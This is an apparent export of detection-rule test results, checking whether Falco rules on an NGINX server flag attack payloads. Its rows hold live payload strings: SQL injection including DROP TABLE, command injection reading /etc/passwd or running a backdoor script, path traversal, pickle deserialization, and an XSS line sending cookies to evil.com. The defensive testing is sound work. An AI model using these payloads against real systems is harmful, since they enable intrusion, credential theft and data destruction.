"DESCRIPTION","DURATION IN MS","NAME","PARENT SUITE","START TIME","STATUS","STOP TIME","SUB SUITE","SUITE","TEST CLASS","TEST METHOD"
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_002` |
| **Name** | pickle.loads Remote Code Execution |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `pickle.loads(base64.b64decode(data))`
- **Encoded**: `pickle.loads%28base64.b64decode%28data%29%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~2000ms
- **Timestamp**: 14:11:55.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt` |
| **Matched Rule** | `[NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1769350315623-6vki09 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1769350315623-6vki09 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1

**Falco Log Entry**:
```
14:11:55.000000000: Critical [NGINX Emerging Threat] Deserialization attack test_id=PICKLE_DESER_002-1769350315623-6vki09 pattern_id=PICKLE_DESER_002 uri=/?q=pickle.loads%28base64.b64decode%28data%29%29 client=127.0.0.1
```","1","test_e2e_with_logs[309_PICKLE_DESER_002]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASIC_013` |
| **Name** | Semicolon with pwd command |
| **Category** | CMDINJ |
| **Subcategory** | basic_command_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `;pwd`
- **Encoded**: `%3Bpwd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~41000ms
- **Timestamp**: 14:11:16.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1769350276136-9geiud pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1769350276136-9geiud pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1

**Falco Log Entry**:
```
14:11:16.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASIC_013-1769350276136-9geiud pattern_id=CMD_BASIC_013 uri=/?q=%3Bpwd client=127.0.0.1
```","2","test_e2e_with_logs[244_CMD_BASIC_013]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_SUB_003` |
| **Name** | Password file via command substitution |
| **Category** | CMDINJ |
| **Subcategory** | command_substitution |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `$(cat /etc/passwd)`
- **Encoded**: `%24%28cat%20%2Fetc%2Fpasswd%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~31000ms
- **Timestamp**: 14:11:26.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command substitution attack` |
| **Matched Rule** | `[NGINX CMDi] Command substitution attack test_id=CMD_SUB_003-1769350286161-c2dwkw pattern_id=CMD_SUB_003 uri=/?q=%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command substitution attack test_id=CMD_SUB_003-1769350286161-c2dwkw pattern_id=CMD_SUB_003 uri=/?q=%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1

**Falco Log Entry**:
```
14:11:26.000000000: Critical [NGINX CMDi] Command substitution attack test_id=CMD_SUB_003-1769350286161-c2dwkw pattern_id=CMD_SUB_003 uri=/?q=%24%28cat%20%2Fetc%2Fpasswd%29 client=127.0.0.1
```","2","test_e2e_with_logs[282_CMD_SUB_003]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ADV_057` |
| **Name** | Semicolon Variant |
| **Category** | PATH |
| **Subcategory** | filter_bypass |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `..;/etc/passwd`
- **Encoded**: `..%3B%2Fetc%2Fpasswd`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~24000ms
- **Timestamp**: 14:11:33.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Advanced path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1769350293187-92vnnr pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1` |
| **Rule Match** | ❌ Mismatch |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1769350293187-92vnnr pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1

**Falco Log Entry**:
```
14:11:33.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_ADV_057-1769350293187-92vnnr pattern_id=PATH_ADV_057 uri=/?q=..%3B%2Fetc%2Fpasswd client=127.0.0.1
```","1","test_e2e_with_logs[181_PATH_ADV_057]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_BLIND_006` |
| **Name** | Time-based conditional blind injection |
| **Category** | SQLI |
| **Subcategory** | blind |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `' AND IF((SELECT COUNT(*) FROM users)>5,SLEEP(5),1) --`
- **Encoded**: `'%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~26000ms
- **Timestamp**: 14:11:31.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Time-based Blind SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769350291204-t17upb pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769350291204-t17upb pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:31.000000000: Critical [NGINX SQLi] Time-based Blind SQL Injection test_id=SQLI_BLIND_006-1769350291204-t17upb pattern_id=SQLI_BLIND_006 uri=/?q='%20AND%20IF((SELECT%20COUNT(*)%20FROM%20users)%3E5%2CSLEEP(5)%2C1)%20-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[025_SQLI_BLIND_006]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_ENC_005` |
| **Name** | Hex encoded whoami command |
| **Category** | CMDINJ |
| **Subcategory** | encoded_commands |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `\x77\x68\x6f\x61\x6d\x69`
- **Encoded**: `%5Cx77%5Cx68%5Cx6f%5Cx61%5Cx6d%5Cx69`
- **Expected Detection**: No

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 0 / 1
- **Latency**: N/A
- **Timestamp**: N/A

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `` |
| **Matched Rule** | `None` |
| **Rule Match** | ✅ Expected Not Detected |

## Detection Evidence



**Falco Log Entry**:
```

```","1","test_e2e_with_logs[262_CMD_ENC_005]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_PROC_002` |
| **Name** | Nohup background execution |
| **Category** | CMDINJ |
| **Subcategory** | process_spawning |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `nohup /tmp/backdoor.sh &`
- **Encoded**: `nohup%20%2Ftmp%2Fbackdoor.sh%20%26`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~21000ms
- **Timestamp**: 14:11:36.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1769350296687-bp68c pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1769350296687-bp68c pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1

**Falco Log Entry**:
```
14:11:36.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_PROC_002-1769350296687-bp68c pattern_id=CMD_PROC_002 uri=/?q=nohup%20%2Ftmp%2Fbackdoor.sh%20%26 client=127.0.0.1
```","1","test_e2e_with_logs[275_CMD_PROC_002]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_DOM_001` |
| **Name** | document.location manipulation |
| **Category** | XSS |
| **Subcategory** | dom_based_xss |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `document.location='http://evil.com/?c='+document.cookie`
- **Encoded**: `document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~48000ms
- **Timestamp**: 14:11:09.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1769350269145-o0qe2 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1769350269145-o0qe2 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:09.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_DOM_001-1769350269145-o0qe2 pattern_id=XSS_DOM_001 uri=/?q=document.location%3D'http%3A%2F%2Fevil.com%2F%3Fc%3D'%2Bdocument.cookie client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[115_XSS_DOM_001]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_ADV_085` |
| **Name** | Stacked Query DROP TABLE |
| **Category** | SQLI |
| **Subcategory** | advanced |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `1;DROP TABLE users--`
- **Encoded**: `1%3BDROP%20TABLE%20users--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~20000ms
- **Timestamp**: 14:11:37.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt` |
| **Matched Rule** | `[NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_085-1769350297218-usaxh pattern_id=SQLI_ADV_085 uri=/?q=1%3BDROP%20TABLE%20users-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_085-1769350297218-usaxh pattern_id=SQLI_ADV_085 uri=/?q=1%3BDROP%20TABLE%20users-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:37.000000000: Warning [NGINX SQLi] Advanced SQL Injection Attempt test_id=SQLI_ADV_085-1769350297218-usaxh pattern_id=SQLI_ADV_085 uri=/?q=1%3BDROP%20TABLE%20users-- client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[010_SQLI_ADV_085]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PICKLE_DESER_004` |
| **Name** | Class MRO Traversal Attack |
| **Category** | PICKLE |
| **Subcategory** | deserialization |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `__class__.__mro__[1].__subclasses__()`
- **Encoded**: `%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~1000ms
- **Timestamp**: 14:11:56.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt` |
| **Matched Rule** | `[NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1769350316625-ci215da pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1769350316625-ci215da pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1

**Falco Log Entry**:
```
14:11:56.000000000: Critical [NGINX Pickle Attack] Pickle deserialization attack attempt test_id=PICKLE_DESER_004-1769350316625-ci215da pattern_id=PICKLE_DESER_004 uri=/?q=%5F%5Fclass%5F%5F.%5F%5Fmro%5F%5F%5B1%5D.%5F%5Fsubclasses%5F%5F%28%29 client=127.0.0.1
```","2","test_e2e_with_logs[311_PICKLE_DESER_004]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BLIND_001` |
| **Name** | Time-based blind command injection |
| **Category** | CMDINJ |
| **Subcategory** | blind_command_injection |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `; sleep 10`
- **Encoded**: `%3B%20sleep%2010`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~35000ms
- **Timestamp**: 14:11:22.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Command injection via semicolon` |
| **Matched Rule** | `[NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1769350282650-yz4plj pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1769350282650-yz4plj pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1

**Falco Log Entry**:
```
14:11:22.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BLIND_001-1769350282650-yz4plj pattern_id=CMD_BLIND_001 uri=/?q=%3B%20sleep%2010 client=127.0.0.1
```","2","test_e2e_with_logs[253_CMD_BLIND_001]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `CMD_BASH_001` |
| **Name** | Direct bash command execution |
| **Category** | CMDINJ |
| **Subcategory** | bash_injection |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `; /bin/bash -c 'whoami'`
- **Encoded**: `%3B%20%2Fbin%2Fbash%20-c%20'whoami'`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~37000ms
- **Timestamp**: 14:11:20.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX CMDi] Advanced command injection attempt` |
| **Matched Rule** | `[NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1769350280645-5qj6a pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1769350280645-5qj6a pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1

**Falco Log Entry**:
```
14:11:20.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_BASH_001-1769350280645-5qj6a pattern_id=CMD_BASH_001 uri=/?q=%3B%20%2Fbin%2Fbash%20-c%20'whoami' client=127.0.0.1
```","2","test_e2e_with_logs[232_CMD_BASH_001]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_ENC_002` |
| **Name** | Double URL encoded traversal |
| **Category** | PATH |
| **Subcategory** | encoded_traversal |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `%252e%252e%252f`
- **Encoded**: `%25252e%25252e%25252f`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~42000ms
- **Timestamp**: 14:11:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Encoded path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769350275647-qi3s7r pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769350275647-qi3s7r pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1

**Falco Log Entry**:
```
14:11:15.000000000: Critical [NGINX Traversal] Encoded path traversal attack detected test_id=PATH_ENC_002-1769350275647-qi3s7r pattern_id=PATH_ENC_002 uri=/?q=%25252e%25252e%25252f client=127.0.0.1
```","2","test_e2e_with_logs[202_PATH_ENC_002]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `PATH_TRUNC_001` |
| **Name** | Null byte truncation |
| **Category** | PATH |
| **Subcategory** | truncation |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `../../../etc/passwd%00.jpg`
- **Encoded**: `..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~32000ms
- **Timestamp**: 14:11:25.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX Traversal] Basic path traversal attack detected` |
| **Matched Rule** | `[NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769350285167-3vf3k pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769350285167-3vf3k pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1

**Falco Log Entry**:
```
14:11:25.000000000: Critical [NGINX Traversal] Basic path traversal attack detected test_id=PATH_TRUNC_001-1769350285167-3vf3k pattern_id=PATH_TRUNC_001 uri=/?q=..%2F..%2F..%2Fetc%2Fpasswd%2500.jpg client=127.0.0.1
```","1","test_e2e_with_logs[210_PATH_TRUNC_001]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
"## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `XSS_ADV_059` |
| **Name** | Math MathML Injection |
| **Category** | XSS |
| **Subcategory** | advanced |
| **Severity** | `HIGH` |

## Attack Details

- **Payload**: `<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>`
- **Encoded**: `%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~28000ms
- **Timestamp**: 14:11:29.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX XSS] DOM-based XSS Attack` |
| **Matched Rule** | `[NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_059-1769350289198-o4e5cj pattern_id=XSS_ADV_059 uri=/?q=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_059-1769350289198-o4e5cj pattern_id=XSS_ADV_059 uri=/?q=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET

**Falco Log Entry**:
```
14:11:29.000000000: Critical [NGINX XSS] DOM-based XSS Attack test_id=XSS_ADV_059-1769350289198-o4e5cj pattern_id=XSS_ADV_059 uri=/?q=%3Cmath%3E%3Cmtext%3E%3Ctable%3E%3Cmglyph%3E%3Cstyle%3E%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E client=127.0.0.1 method=GET
```","2","test_e2e_with_logs[097_XSS_ADV_059]","allure","2026-01-25","passed","2026-01-25","","test_e2e_wrapper","",""
